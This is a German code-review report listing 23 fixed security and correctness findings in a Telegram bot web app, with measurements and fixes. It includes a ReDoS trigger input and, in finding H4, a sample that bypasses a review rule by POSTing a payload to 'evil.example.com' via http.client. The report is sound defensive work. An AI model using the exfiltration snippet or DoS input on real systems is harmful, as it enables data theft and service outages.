# Code-Review v2.13.0 — 2026-09

Vollständige Durchsicht des Projektcodes nach dem Deployment-Release 2.12.0.
**23 Befunde, alle behoben.** Jeder Befund nennt den Nachweis; Befunde ohne
reproduzierbaren Nachweis sind nicht aufgeführt (siehe „Nicht als Befund
gewertet" am Ende).

| Bereich | Dateien | Befunde |
|---|---|---|
| Konvertierung / Splitting | `utils.py` | 6 |
| HTTP-Schicht / App | `app.py`, `sender.py`, `botkit/telegram_api.py` | 8 |
| Session / Registry | `botkit/session.py`, `botkit/registry.py`, `botkit/tokens.py` | 5 |
| Review-Tor | `botkit/review.py` | 4 |
| CLI | `botctl.py` | 1 |
| Formular | `templates/index.html` | 1 |

**Schwere:** 5 kritisch, 4 hoch, 8 mittel, 6 niedrig.
**Tests:** 522 → 609 (+87), `ruff` fehlerfrei.

---

## Kritisch

### K1 — Quadratischer Fence-Regex (CPU-DoS, unauthentifiziert)

`utils.py`, zwei Aufrufstellen. Muster `` ```([^\n]*)\n ``.

Die Gruppe `[^\n]*` bekommt keine `sre`-Literal-Tail-Optimierung (anders als
ein reines Zeichenketten-Literal). An jeder der ~n Positionen, an denen
```` ``` ```` vorkommt, frisst sie Zeichen für Zeichen bis zum Zeilenende und
backtrackt dann. Enthält der Text **kein** `\n` — bei einer Anfrage voller
Backticks der Regelfall —, scheitern *alle* Positionen nach O(n)
Fehlversuchen. Ergebnis: ~10⁹ Regex-Schritte pro Anfrage.

`"x" * 100000` ist eine gültige Eingabe: 100 000 ≤ `MAX_INPUT_CHARS`,
~100 KB ≤ `MAX_BODY_BYTES`, und `needs_rich_message()` ist für Backticks
falsch — der Regular-Pfad wird genommen und die Kosten fallen vollständig an.

**Messung v2.12.0** (`markdown_to_html("`" * n)`):

| n | Zeit |
|---|---|
| 2 000 | 0,024 s |
| 4 000 | 0,112 s |
| 8 000 | 0,394 s |
| 20 000 | ~2,4 s (extrapoliert) |
| **100 000** | **~60 s** |

Bei `CONVERTS_PER_MINUTE = 60` pro IP und 8 Gunicorn-Threads reichen wenige
solcher Anfragen, um alle Threads dauerhaft im Regex zu binden. Ohne
Proxy-Header-Vertrauen nötig, ohne Authentifizierung nutzbar.

**Fix.** Gemeinsames, vorkompiliertes Muster mit beschränkter Info-String:

```python
_FENCE_BLOCK_RE = re.compile(r"```([^`\n]{0,64})\n(.*?)```", re.DOTALL)
```

**Messung v2.13.0:** 0,002 s / 0,002 s / 0,005 s / 0,012 s / **0,070 s** —
linear statt quadratisch, **≈850×** schneller am Limit.

Nebenwirkung, die die Korrektheit verbessert: laut CommonMark darf die
Info-String eines Backtick-Fences **kein Backtick** enthalten. `` ```a`b ``
ist gar kein Fence und wurde vorher fälschlich als einer geschluckt.

Beide Aufrufstellen teilen sich jetzt das Muster statt es zu duplizieren.

---

### K2 — Rich-Pfad erzeugte nicht sendbare Chunks

`utils.py::_rebalance_markdown_chunks`, `utils.py::_rebalance_html_chunks`.

Der Carry — was in den Folge-Chunk getragen wird — war auf `_RICH_MAX_CARRY`
(4) gekappt, das **Closing** — was in den aktuellen Chunk geschrieben wird —
nicht. `closing` wuchs daher unbegrenzt.

**Messung v2.12.0** (`build_messages`, Limit 32 768 UTF-16-Einheiten):

| Eingabe | Eingabelänge | Chunkgröße | Faktor |
|---|---|---|---|
| `"$x$ " + "**~~" * 4000` | 16 005 | 32 004 | 1,0× |
| `"$x$ " + "**~~" * 8000` | 32 005 | **64 004** | 2,0× |
| `"$x$ " + "<u>" * 10900` | 32 705 | **76 304** | 2,3× |

Telegram antwortet 400 `MESSAGE_TOO_LONG`. Es wurde also **nichts zugestellt** —
der Nutzer sieht eine generische Fehlermeldung. Die Eingaben liegen mit 32 705
Zeichen klar unter `SHARED_WEB_MAX_INPUT_CHARS` (64 000).

Der Docstring von `_RICH_MAX_CARRY` beschrieb das Sollverhalten seit v2.11.1
wörtlich: *„Tief verschachtelte `<u>` würden sonst Carry + Closing unbegrenzt
wachsen lassen und die 64-Zeichen-Reserve sprengen — der HTML-Pfad kappt schon
immer."* Der Code hielt das nur für den Carry ein.

**Fix.** Schließer auf die innersten `_RICH_MAX_CARRY` Ebenen kappen. Äußere,
offen bleibende Marker rendern im Rich-Markdown als Literal — dieselbe
Abwägung, die der Carry ohnehin macht.

**Nachher:** 16 006 / 32 012 / 32 720. Alle unter dem Limit.

Der HTML-Pfad (`_rebalance_html_chunks`) hatte denselben Defekt (bei 1 000
Ebenen: 7 001 Zeichen) und ist über `build_messages` heute nicht erreichbar.
Er kann aber **nicht** einfach gekappt werden: bei echten HTML-Tags entstünde
unbalanciertes Markup, das Telegram mit 400 `can't parse entities` ablehnt.
Stattdessen wird der Öffner des Überschusses aus der Ausgabe **entfernt**, der
Inhalt bleibt als Klartext. Tiefe 1 000 → 29 Zeichen, Wohlgeformtheit geprüft
(`count("<u>") == count("</u>")`).

---

### K3 — Leere Chunks brachen den ganzen Versand ab

`utils.py::_dangling_tail`, `utils.py::_rebalance_html_chunks`.

`_dangling_tail` bestimmt das Fragment am Chunk-Ende, das einen unvollständigen
Tag anzeigt, damit es in den nächsten Chunk wandert:

```python
lt = chunk.rfind("<")
if lt != -1 and ">" not in chunk[lt:]:
    tail_from = lt          # -> 0, wenn das < das erste Zeichen ist
```

Beginnt ein Chunk mit `<a href="…` und wird mitten in einer ~4 000-Zeichen-URL
geschnitten, ist `tail_from == 0` — der **komplette** Chunk ist das Tail. Der
Rest ist der leere String, und `build_messages` filterte ihn nicht.

`sendMessage` beantwortet einen leeren Text mit 400
`message text is empty`, und der **gesamte** Stapel bricht ab.

**Messung v2.12.0:** `"[x](https://a/" + "a" * 4000 + ")"` →
Chunk-Größen `[0, 0, 4021]`.

**Fix, zweistufig.** `_dangling_tail` gibt nie den ganzen Chunk zurück (ein
Fragment, das nichts übrigließe, ist keins); `_rebalance_html_chunks` verwirft
leere Chunks zusätzlich als Verteidigung in der Tiefe.

---

### K4 — Bot-Token im Klartext in der URL

`templates/index.html::#byobForm`.

```html
<form id="byobForm" class="tf-form" autocomplete="off" novalidate>
```

Kein `method`, kein `action`. Der HTML-Default ist **GET**, die Navigation geht
an die aktuelle URL inkl. Query-String. `byob.js:212` ruft
`event.preventDefault()` — aber nur wenn das Skript läuft.

Auslöser, die den Fallback real werden lassen:

* JavaScript deaktiviert — die Seite liefert ein `<noscript>`, das **dasselbe
  Versprechen** gibt („ohne JavaScript funktioniert alles")
* `byob.js` liefert 404
* Fehler **vor** dem Anhängen des Listeners

Dann navigiert ein Klick auf „Eigene Bot-Session starten" zu:

```
GET /?token=123456789:AAE…&chat_id=4711
```

Diese URL landet in der Adressleiste, in der Browser-Historie und **im
Caddy-Access-Log** (console-Format, `%r` enthält den Query-String) — also in
`docker compose logs proxy`, in jedem Log-Shipper, in jedem Screenshot. Ein
Bot-Token im Klartext ist **vollständige Bot-Übernahme**.

Damit sind zwei eigene Aussagen der Seite falsch: `index.html:549`
(„Wird nur im RAM der Session gehalten — nie gespeichert, **nie geloggt**") und
`:1024-1027` („keine Datei, keine Datenbank, kein Log"). Ebenso die
Privacy-Redaction, die auf `botkit/privacy.py` beruht.

**Fix.** `method="post"` + `action="{{ url_for('byob_session_open') }}"`. Damit
landet der Token im Request-Body. Zwei Konsequenzen mitgezogen:

1. `_json_or_form_body()` — sonst lehnt der Endpunkt den Formular-Body ab und
   `method="post"` wäre nur gegen das Leck abgesichert, der Nutzer ohne JS
   könnte aber gar keine Session öffnen.
2. `_consent_given()` — `data.get("consent") is not True` lehnt den
   Formular-Weg ab, weil eine angehakte Checkbox den **String** `"on"` sendet,
   nicht `true`. Ohne diese Korrektur wäre `method="post"` eine Scheinlösung.

`"false"`, `"0"` und `""` sind ausdrücklich **keine** Zustimmung; im
JSON-Pfad gilt weiterhin nur der echte Boolean `True`.

---

### K5 — `compare_digest` auf `str` erzeugte 500 statt 401

`app.py::_request_authenticated`, `app.py::_guard`.

```python
hmac.compare_digest(request.headers.get("X-Auth-Token", ""), API_TOKEN)
```

`hmac.compare_digest` ist `_hashlib.compare_digest`. Dessen C-Body:

```c
if (PyUnicode_Check(a) && PyUnicode_Check(b)) {
    if (!PyUnicode_IS_ASCII(a) || !PyUnicode_IS_ASCII(b)) {
        PyErr_SetString(PyExc_TypeError,
            "comparing strings with non-ASCII characters is not supported");
```

PEP 3333 schreibt vor, dass WSGI-Server Header-Bytes als **latin-1**
dekodieren; gunicorn tut das. Ein Client, der ein einzelnes Byte `0xE4`
mitsendet, erzeugt damit reproduzierbar den Python-String `'ä'` → `TypeError`.

**Folge:** Jeder unauthentifizierte Client verwandelt jeden
token-geschützten POST in einen **500** (mit Stack-Trace im Log). Betroffen
sind `/api/convert`, `/api/byob/*` und — bei `SHARED_WEB_SEND=1`, wie im
ausgelieferten `render.yaml` — `_request_authenticated()` im Sendepfad, womit
der **gesamte anonyme Shared-Send** ausfällt statt 401 zu liefern.

Kein Auth-Bypass, aber ein trivial erreichbarer 500 auf der Schreib-API.

**Fix.** `_token_matches()` vergleicht Bytes. Der Vergleich bleibt
zeitkonstant; die Länge ist durch die Tokenlänge ohnehin bekannt.

*Geprüft und nicht betroffen:* `authenticate()` in `_ByobRuntime` vergleicht
SHA-256-**Digests** (Bytes) — für den `TypeError` nicht anfällig.

---

## Hoch

### H1 — Bot-Token in der Exception-Chain

`botkit/telegram_api.py::_post`.

```python
except requests.RequestException as exc:
    raise TelegramAPIError(f"Netzwerkfehler bei {method}: …") from exc
```

`from exc` setzt `__cause__`. `str(requests.exceptions.ConnectionError)`
enthält den vollen Pfad `/bot<BOT_ID>:<35 Zeichen Geheimnis>/getMe` — das
Token im Klartext. Es landet damit in jedem `logging.exception`, jedem
`traceback.print_exc()` und jedem Flask-Debug-Traceback, bei jedem Aufrufer,
der `install_privacy_filters()` nicht benutzt.

`sender.py:161-165` macht **dieselbe** Kontrolle anders und sagt warum:
`from None` mit dem Kommentar *„Nur der Klassenname — str(exc) würde die URL
inkl. Bot-Token enthalten (K-1)."*

Der Kommentar hier behauptete dagegen: *„Kein Inhalt, kein Token in der
Fehlermeldung."* Das war für `str(exc)` richtig und für das Objekt falsch.

**Fix.** `from None`, Kommentar mit dem Verweis K-1.

**Verifiziert:** `TOKEN in traceback.format_exc()` → `False`.

---

### H2 — Review-Tor konnte bei CRLF nie freigeben

`botkit/review.py::ReviewGate.submit` vs. `::ReviewGate.verify`.

| | Quelle | Bei CRLF |
|---|---|---|
| `submit` | `analyze_source(path)` → `read_text()` (normalisiert CRLF → LF) → `source.encode("utf-8")` | `3172372e…` |
| `verify` | `source_sha256(path)` → `read_bytes()` | `58ac8a71…` |

Die beiden Werte waren **nie** gleich, wenn die Datei CRLF enthält
(`core.autocrlf`, Windows-Checkout, einzelne `\r`). `ledger.ticket_for(bot_id,
sha)` fand nie ein Ticket, und die Fehlermeldung („Bitte 'botctl review'
ausführen") half nicht weiter, weil Review **korrekt** gelaufen war.

Die Bindung sollte auf den **Bytes auf der Platte** liegen — nur `verify` tat
das. `tests/test_review.py:180` verglich zwei Byte-Digests und prüfte die
Stelle nicht.

**Fix.** `submit` bindet über `source_sha256(path)`. Zusätzlich nimmt `submit`
einen bereits berechneten `report` entgegen, damit `botctl review` die Datei
nicht zweimal liest (vorher: doppelte Analyse mit TOCTOU-Fenster — zwischen
den Lesevorgängen konnte jemand editieren, sodass am Bildschirm ein Report
erschien, für den nie ein Ticket existierte).

---

### H3 — Audit-Trail wurde in place gekürzt

`botkit/review.py::ReviewLedger.save`.

`write_text` öffnet mit `"w"` und kürzt sofort. Der `flock` in
`_ledger_transaction` (`botctl.py:106`) verhindert gleichzeitige *Schreiber*,
sagt aber nichts über einen Kill, eine volle Platte oder einen Stromausfall
zwischen Kürzen und letztem Byte. Danach meldet `load()`
`"ist beschädigt"`, `botctl` endet mit Exit 1 — und mit dem Trail sind **alle**
aufgezeichneten Freigaben verloren.

Fail-closed, also kein Sicherheitsloch — aber der komplette Review-Workflow
steht, und die Manipulationsnachweise sind weg.

**Fix.** Temp-Datei + `os.replace` (atomar auf POSIX **und** Windows), mit
Aufräumen der `.tmp`-Datei im Fehlerfall.

---

### H4 — BK004 (Exfiltrations-Blocker) umgehbar

`botkit/review.py`. BK004 ist die einzige Regel, die einen geprüften Bot
daran hindert, Nachrichten nach außen zu schicken. `visit_Call` prüft nur:

```python
if short in HTTP_CALL_NAMES and root in HTTP_MODULE_ROOTS:
```

`http.client` ist in weder `FORBIDDEN_IMPORTS` noch in
`HTTP_MODULE_ROOTS` als Konstruktor erfasst, seine Klassen stehen nicht in
`HTTP_CALL_NAMES`.

Durchlaufen:

```python
import http.client                                  # root "http" -> nicht verboten
c = http.client.HTTPSConnection("evil.example.com")  # tail nicht in der Client-Menge
c.request("POST", "/collect", body=payload)          # short "request" IST in HTTP_CALL_NAMES,
                                                     #   aber root = "c" -> keine Pruefung
```

`_resolve_call_name("c.request")` liefert `"c.request"` unverändert (kein
Eintrag in `name_paths`/`root_aliases`), `root == "c"` ist nicht in
`HTTP_MODULE_ROOTS` → `_check_http_target` läuft nie. `report.ok` ist `True`,
`botctl review` meldet „keine Befunde", das Ticket wird freigegeben.

Derselbe Weg über `urllib3.PoolManager().request(url, …)` — dort ist der
Receiver ein `ast.Call`, `_dotted` gibt `""` zurück.

**Fix.**

* `urllib3` in `FORBIDDEN_IMPORTS`
* `_CONNECTION_CLASSES` (`HTTPSConnection`, `HTTPConnection`,
  `AsyncHTTPConnection`, `PoolManager`, `ProxyManager`, `HTTPConnectionPool`,
  `HTTPSConnectionPool`): der **Konstruktor** wird geprüft, denn dort steht
  der Host im String-Argument
* `host_is_bare_host=True`, weil `urlparse("evil.example.com").hostname` leer
  ist — ohne diesen Schritt wäre die Meldung „kein Host erkennbar" statt des
  präzisen BK004 mit dem echten Namen, und ein *erlaubter* Host hätte denselben
  Code durchlaufen
* Folgeaufrufe über ein Alias-Handle → BK010 („nicht prüfbar"), getrennt von
  BK004

`api.telegram.org` bleibt erlaubt (Test dafür).

---

## Mittel

### M1 — `botctl send` druckte bei jedem Telegram-Fehler einen Traceback

`botctl.py:371`, `botctl.py:463`.

`SendError` (`sender.py:44`) und `SessionError` sind **Geschwister**: beide
`RuntimeError`, keine Verwandtschaft. `SendError` war nicht importiert und in
keiner `except`-Klausel. Jeder Telegram-400/429/5xx/Netzwerkfehler entkam
`main()` komplett.

Damit wurden **beide** Verträge umgangen: der `except`-Zweig („✖ Versand
abgebrochen") und das `finally` mit `scrub_environment`. Der
wahrscheinlichste Fehlerfall des Kommandos war der einzige mit Stacktrace.

Die drei `botctl`-Sendetests monkeypatchen den Sender mit einer Funktion, die
immer erfolgreich ist — der Pfad war ungetestet.

**Fix.** `except (SessionError, SendError)`, dazu `retry_after` als Hinweis.

---

### M2 — 429-Backoff fehlte, Abbruch verbrauchte das ganze Budget

`botkit/session.py::send_messages`, `sender.py`.

`retry_after` war durch die gesamte Schicht plumbed — und wurde dann nie
beachtet. `send_message` macht genau **einen** POST: kein Retry bei transienten
Netzwerkfehlern, kein Retry bei 5xx, bei 429 `SendError` ohne Warten.

`_reserve_rate_budget(len(messages))` buchte **vor** dem Versand alle Plätze.
Ein Abbruch bei Chunk 7 von 17 brach die Chunks 8–17 ab, während das Budget
für alle 17 verbraucht blieb: halbe Nachricht **und** erschöpftes Limit. Ein
manueller Wiederholungsversand duplizierte die bereits zugestellten Chunks.

`cli.py:99` druckte nur `str(exc)` und ließ `retry_after` ganz weg, während der
Web-Pfad längst einen `note`-Hinweis lieferte.

**Fix.** `_send_with_backoff` wiederholt denselben Chunk, **begrenzt** auf
`max_backoff_attempts=3` und `max_backoff_seconds=5`. Die Obergrenzen sind
nötig: Telegram nennt auch mal 60+ Sekunden, und ein Blockade-Sleep friert bei
1 Worker / 8 Threads die Instanz ein. `_release_rate_budget(total - sent)` gibt
nicht gesendete Plätze zurück. `_touch()` läuft nach jedem Chunk statt am
Stapelende (sonst konnte ein paralleles `reap_expired` mitten im Versand
schließen).

**Verifiziert:** Abbruch bei Chunk 3 von 9 hinterlässt exakt 2 gebuchte Plätze.

---

### M3 — Keine Sperre in `BotSession`

`botkit/session.py`.

Der Modulkommentar zu Audit M-7 hält fest: *„Dikt-Mutationen sind nicht
atomar; unter Threads (Gunicorn --threads …) ohne Lock potenziell 'dictionary
changed size during iteration'."* `SessionManager` bekam daraufhin
`self._lock = threading.RLock()`. **`BotSession` bekam keine.**

`_reserve_rate_budget` ist ein nicht-atomares Read-Modify-Write auf einem
Instanzattribut (`self._sent_timestamps = [...]` bindet neu, dann `.extend`).
Zwei parallele `POST /api/byob/send` mit derselben `session_id` (zwei Tabs,
Doppelklick, Retry neben dem Original) konnten beide `len(...) == 5` lesen und
beide `5 + 12 > 20 == False` passieren. Auch `stats.chunks_sent` war ungeschützt.

Das 20-Nachrichten-pro-Minute-Limit existiert ausdrücklich „Schutz vor
Telegram-Sperren" — und wurde von der genauen Konfiguration umgangen, die das
Dockerfile vorschreibt.

**Fix.** `threading.RLock` um Check und Buchung; `close()` ebenfalls
atomar. Test: 20 parallele Threads, nie mehr als das Limit gebucht.

---

### M4 — `BotRegistry` hatte dieselbe Lücke

`botkit/registry.py`.

* `get()` las den Record und `del`te danach. Ein zwischenzeitliches
  `register()` für dieselbe `bot_id` wäre vernichtet worden.
* `purge_expired()` iterierte über `self._records.items()`, während ein
  anderer Thread darin `del` ausführte → `RuntimeError: dictionary changed
  size during iteration`. (Heute nie in Produktion aufgerufen, daher nicht
  beobachtet.)

**Fix.** Sperre in `__init__`; bedingtes Löschen in `get()`
(`if self._records.get(bid) is record`); Liste unter der Sperre bilden. Test:
4 Threads (2× `register`, 2× `purge`) ohne Ausnahme.

---

### M5 — `register()` löschte jede bestehende Freigabe

`botkit/registry.py::register`.

```python
record = RegistrationRecord(identity=…, …)   # status=PENDING, notes=[]
self._records[identity.bot_id] = record       # wholesale replace
```

`status`, `approved_source_sha256` und `notes` des alten Datensatzes waren
danach weg — `mark_approved` also nicht dauerhaft. Registrieren ist der
**Normalpfad** beider Aufrufer (`botctl.cmd_send:317`,
`_ByobRuntime.open_session`), eine Freigabe damit bei jedem zweiten `open()`
stillschweigend hinfällig.

Gedämpft wird das dadurch, dass `_gate()` `registry=None` hartkodiert
(`botctl.py:116`) und die gehostete App nichts freigibt — für jeden
Verbraucher, der die Registry *einbindet*, war der approve→revoke-Lebenszyklus
aber kaputt.

**Fix.** Vorhandenen Datensatz in place aktualisieren
(`identity`, `owner_ref`, `owner_fingerprint`, `registered_at`, `expires_at`).

---

### M6 — `revoke()` setzte REVOKED und löschte im nächsten Schritt

`botkit/registry.py::revoke`.

`record.status = REVOKED`, dann `del self._records[int(bot_id)]`. Der Status
war **nicht beobachtbar**; `_require()` meldete danach „nicht (mehr)
registriert" statt „widerrufen". `REJECTED` war ebenfalls von „absent" nicht
unterscheidbar.

**Fix.** Record behalten, auf `REVOKED` setzen. Der Audit-Unterschied zwischen
„nie bekannt" und „kannte das Team und hat es abgelehnt" bleibt erhalten.

---

### M7 — Kapazitäts-Lock über den `getMe`-Round-Trip

`app.py::byob_session_open`.

```python
with runtime.capacity_lock:          # prozessweit, nicht reentrant
    …                                # 15 Zeilen
    session, … = runtime.open_session(token, chat, ip=ip)
```

`open_session` → `registry.register` → `verify` → `get_me(timeout=15 s)`: ein
blockierender HTTPS-Round-Trip **unter** der globalen Sperre. Bei 8 Threads
serialisierten sich 8 gleichzeitige `POST /api/byob/session` bis zu
8 × 15 s = 2 min; die ganze Instanz stand still, inklusive `/` und
`/healthz`.

Der Kommentar begründete das mit der Kapazitätsprüfung: mehrere gleichzeitige
`open` könnten alle die Grenze passieren, bevor einer eingefügt ist. Mit einer
**Nachprüfung** ist das genauso erreichbar und ohne den Serialisierungspunkt.

**Fix.** `_ByobRuntime.verify_token()` (Phase 1, ohne Sperre) und
`open_session(record=…)` (Phase 2, unter der Sperre mit erneuter Prüfung).

---

### M8 — Rate-Limit-Eimer wurden nie geraumt

`app.py::_prune_rate_buckets`.

```python
stale = [key for key, hits in _RATE_HITS.items() if not hits]   # nur LEERE
```

Ein Client mit genau **einer** Anfrage hinterlässt ein `deque` mit *einem*
Zeitstempel. Das ist nicht leer und wird erst geleert, wenn **derselbe** Key
zurückkehrt — und das Leeren passiert **nach** dem Prune-Aufruf
(`while hits and hits[0] < …: hits.popleft()` in Zeile +5). Ein-shot-Adressen
sammelten sich dauerhaft an; bei IPv6 ist jeder /64-Präfix eine „neue"
Adresse.

Zweiter Fehler derselben Stelle: `if len(_RATE_HITS) > _RATE_PRUNE_THRESHOLD`
lief bei **jedem** Request. Einmal überschritten bleibt die Schwelle es (die
Zahl wächst monoton, bis etwas entfernt wird) → jeder Request zahlte ein
vollständiges O(n)-Iterieren unter dem globalen Lock, ein Serialisierungspunkt
über alle 8 Threads.

**Fix.** Sweep nach Alter (leer **oder** letzter Treffer älter als das Fenster)
und Drosselung auf `_RATE_PRUNE_INTERVAL` (60 s).

---

## Niedrig

### N1 — Vereinzelte UTF-16-Surrogate → 500

`utils.py::_telegram_len`, `app.py::_valid_text`.

Der `json`-Decoder erzeugt aus `"𝆓"` einen *ungepaarten* Surrogate — ASCII auf
dem Draht, also von jeder UTF-8-Validierung nicht zu beanstanden.
`unicodedata.normalize("NFC", …)` lässt ihn durch; `utf-16-le` scheitert mit
`UnicodeEncodeError`.

Auf den Sendewegen kam Schlimmeres dazu: `requests` kann denselben String nicht
als JSON-Body kodieren, und `UnicodeEncodeError` ist **keine**
`RequestException` — der Fehler entkam also `sender.py:161`, und ein bereits
halb zugestellter Versand wurde als undurchsichtiger 500 mit **keinem**
`sent_before_error` gemeldet.

**Fix.** `_has_lone_surrogate()` an der Eingangsgrenze → 400. Test prüft, dass
`"𝓀"` abgelehnt und ein vollständiges Emoji-Paar akzeptiert wird.

---

### N2 — `Origin: null` umging die CSRF-Prüfung

`app.py::_guard`.

```python
parsed = urlparse(origin)
if parsed.netloc and parsed.netloc != request.host:   # netloc == "" -> übersprungen
```

`urlparse("null").netloc == ""`. Sandboxed iframes, `file://` und einige
Redirect-Verläufe senden genau das. Die Prüfung war schwächer, als der
Docstring behauptete.

Nicht ausnutzbar: die App verwendet keine Cookies, Handle und Secret liegen im
Body. Die Lücke war die *Behauptung*, nicht der Angriff.

**Fix.** Leerer `netloc` ist kein gleicher Ursprung → 403.

---

### N3 — Leerzeilen und Einrückung gingen beim Splitting verloren

`utils.py::chunk_text`, `utils.py::_split_guarded_unit`.

Absatz-Splitting: `re.split(r"\n\s*\n", text)` ist über Zeilengrenzen gierig
(`"a\n\n\n\nb"` → `['a','b']` → `"a\n\nb"`), und `if p.strip()` verwarf reine
Whitespace-Absätze. `index.html:903` verspricht ausdrücklich „Leerzeilen
zwischen Absätzen bleiben erhalten".

Formel-Splitting: `for ln in lines if ln != ""` verwarf Leerzeilen,
`part.strip()` die führende Einrückung. Bei mehrzeiligen Display-Formeln
(`\begin{aligned} … \\ …`) änderte das das Rendering — **nur an der
Teilungsgrenze**, also scheinbar zufällig. Der Fence-Pfad bewahrt Leerzeilen
seit v2.11.0 ausdrücklich; der Formel-Pfad war die Ausnahme.

**Fix.** Schnitt auf genau eine Leerzeile (`\n[ \t]*\n`), Trenner als
eigenes Listenelement mitführen; im Formel-Pfad `splitlines(keepends=True)`
und pro Fragment **genau einen** trennenden Umbruch entfernen
(`endswith("\n\n")` heißt: die letzte Zeile war leer — der zweite Umbruch
gehört zu ihr). Kein `.strip()` mehr.

Ein Detail, das beim ersten Versuch falsch war: `add` darf nur die **eigene**
Zeile zählen, nicht den Puffer, sonst wird `size` ab dem zweiten Absatz doppelt
gezählt (26 100 Zeichen ergaben so 150 statt 8 Chunks).

---

### N4 — BK002 meldete gewöhnliche Builtins als BLOCKER

`botkit/review.py::visit_Call`.

`PERSISTENCE_CALLS` wird gegen den **letzten** Namensbestandteil geprüft und
enthält `set`, `remove`, `save`. Damit waren der Builtin `set()`, `seen = set()`,
`results.remove(x)` und `config.save()` **BK002-BLOCKER**. `seen = set()`
allein stoppte jedes Review.

Gleichzeitig ein False Negative: `any(flag in mode for flag in ("w","a","x"))`
ließ `open(p, "r+")` durch — `+` heißt lesen **und** schreiben.

**Fix.**

* BK002 nur, wenn der Empfänger auf einen bekannten persistenzverdächtigen Typ
  auflösbar ist (`_PERSISTENCE_ROOTS` + neue `_receiver_root()`-Auflösung, die
  auch `p = Path(x); p.unlink()` erfasst)
* sonst **BK010** („nicht prüfbar") — dieselbe Trennung, die die HTTP-Regeln
  seit jeher fahren
* `open`: Positivliste; `open(p)` gilt korrekt als `open(p, "r")`

---

### N5 — Kleinere Regel-Lücken

* `import random` ergab **kein** BK012, `from random import choice` schon. Fix in
  `visit_Import`.
* Ein hartkodiertes Token ergab **zwei** BK006-Befunde: `visit_Assign` meldete
  es, `generic_visit` lief danach in `visit_Constant` für denselben Knoten.
  Weil `submit()` `[f"{rule_id}@{line}"]` protokolliert, lagen die Duplikate
  dauerhaft im Audit-Trail — 4 Befunde für 2 Probleme. Fix: `visit_Constant`
  ist der einzige Melder; der Zweig für sprechende Zielnamen (`API_KEY`,
  `password`) bleibt.

---

## Nicht als Befund gewertet

Geprüft und **bewusst nicht** geändert. Damit sie beim nächsten Review nicht
erneut untersucht werden:

| Punkt | Warum kein Befund |
|---|---|
| **Kein `parse_mode`-Fallback** | Telegram lehnt `can't parse entities` ab. Ein zweiter Versuch ohne `parse_mode` stellt Text **ohne Formatierung** zu — stiller Inhaltsverlust. Bewusst nicht implementiert; die HTML-Erzeugung ist auf Wohlgeformtheit getestet. |
| **Keine Retries auf Netzwerkfehler/5xx** | Automatische Retries erzeugen Duplikate, wenn der erste Versuch doch zugestellt hat. Nur 429 wird wiederholt, weil Telegram die Wartezeit liefert. |
| **`requests.Session` prozessweit geteilt** | `requests.Session` ist laut Dokumentation nicht thread-sicher (mutiert `cookies` je Antwort). Die beteiligten Dikt-Operationen sind GIL-atomar; es wurde **kein** Fehler reproduziert. `botkit/telegram_api._post` nutzt weiterhin ungepoolt — die Inkonsistenz ist real, aber ohne belegten Schaden. |
| **Über-4096-Chunk aus `_rebalance_html_chunks`** | Der vom Reaper vermutete zweite Teil liefert messbar **kein** überzogenes Fragment; nur der leere Chunk war real (K3). |
| **`sent_before_error` bei Surrogat-Fehlern** | Ursache mit N1 behoben; die Zählung selbst war korrekt. |

---

## Testabdeckung

87 neue Tests. Jeder Befund hat mindestens einen Test mit dem konkreten
Fehlerbild oder dem Messwert, nicht nur eine Behauptung.

| Bereich | Tests | Was geprüft wird |
|---|---|---|
| ReDoS | 5 | Zeitgrenze absolut (3 s bei 100 000) **und** relativ (linear ≪ quadratisch); Muster-Sharing; CommonMark-Fence |
| Chunk-Grenzen | 4 | jede Chunkgröße ≤ Limit; Schließerzahl ≤ `_RICH_MAX_CARRY`; HTML-Stack-Tiefe 500/1000/5000 wohlgeformt |
| Leere Chunks | 1 | 4 Eingabevarianten, kein leerer Chunk |
| Splitting | 8 | Roundtrip verlustfrei; Leerzeilen; Whitespace; Grenzwerte; Formel-Einrückung |
| Auth | 3 | Nicht-ASCII-Header → 401; `Origin: null` → 403; Surrogat → 400 |
| Rate-Limit | 4 | Sweep nach Alter; Ein-shot-Adressen entfernt; Sweep gedrosselt |
| Review-Gate | 4 | **CRLF-Freigabe muss funktionieren**; geänderte Bytes abgelehnt; `submit` nutzt den gelieferten Report |
| Ledger | 3 | Roundtrip; `OSError(ENOSPC)` lässt den alten Trail **unangetastet**; keine `.tmp`-Reste |
| BK004 | 5 | `http.client`/`urllib3` blockiert; Aliase blockiert; erlaubter Host durchgelassen; dynamischer Host → BK010 |
| BK002 | 9 | `set()`/`remove`/`save` **ohne** BK002; 4 echte Persistenzfälle **mit** BK002; `signal.connect` erlaubt |
| `open`-Modi | 10 | 8 Schreibmodi blockiert (inkl. `r+`); 3 Lesemodi erlaubt |
| BK006 | 3 | ein Befund pro Token; Zielnamen weiterhin erkannt; Fixture ohne Duplikate |
| Backoff | 4 | Retry bei 429 mit Wartezeit; Obergrenzen; kein Retry bei 400 |
| Budget | 2 | Rollback bei Teilversand; 20 parallele Threads |
| Thread-Sicherheit | 2 | 4-Thread-`register`/`purge`; `close()` 8× parallel |
| Registry-Lebenszyklus | 3 | Freigabe überlebt Re-Registrierung; `revoke()` beobachtbar; `purge` behält REVOKED |
| Formular | 7 | `method="post"`; kein GET-Weg; Action = Endpunkt; Nicht-JS-POST **funktioniert**; JSON hat Vorrang |
| Chunks/Anfrage | 2 | Default verkleinert keine dokumentierte Eingabe; 400 **vor** jedem API-Aufruf |
| Vault | 6 | `store` begrenzt; Sweep bei `store`; ältestes zuerst; Docstring-Zusage |
| Reaper | 1 | Docstring behauptet keinen Timer mehr |

```
609 passed, 1 skipped
ruff check .   →  All checks passed!
```
